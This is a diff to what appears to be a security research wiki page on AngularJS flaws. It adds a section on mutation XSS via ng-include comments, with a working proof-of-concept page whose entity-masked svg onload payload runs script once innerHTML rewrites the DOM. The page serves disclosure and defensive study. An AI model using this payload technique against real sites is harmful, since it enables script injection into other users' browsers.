@@ -438,6 +438,24 @@ This enables another very interesting way to execute arbitrary !JavaScript using
 
 In no way should a `class` attribute ever be able to execute arbitrary !JavaScript. This issue currently seems to be the most risky part of AngularJS' directives. It further enables yet another CSP bypass in combination with a GIF file:
 
+Demo: http://html5sec.org/cspbypass/
+
+== mXSS via HTML Import ==
+
+AngularJS has the habit of using `document.createComment()` for several directives. It for example creates a comment as soon as an include has taken place and tells the DOM "hey, here's the comment telling everyone that I just included stuff". While there's certainly a great, super-heroic reason for that, there's also an interesting vulnerability hidden beneath. 
+
+This time it's an mXSS problem that can emerge, in case the attacker is able to minimally influence fragments of the include path via `location.hash` or alike:
+
 {{{
-soon to be released...
+<!doctype html>
+<html ng-app>
+<head>
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.2.6/angular.min.js"></script>
+</head>
+<body>
+<b class="ng-include:'somefile?--&gt;&lt;svg&sol;onload=alert&lpar;1&rpar;&gt;'">HELLO</b>
+<button onclick="body.innerHTML+=1">do the mXSS thing</button>
+</body>
 }}}
+
+Two things happen here: The include takes place (404 or not, doesn't matter) and AngularJS writes the comment into the DOM. Then, we have an `innerHTML`-access. This re-writes the markup and thereby activates the XSS hidden within the HTML comment. Note that we use HTML entities to mask our payload - yet it still works.
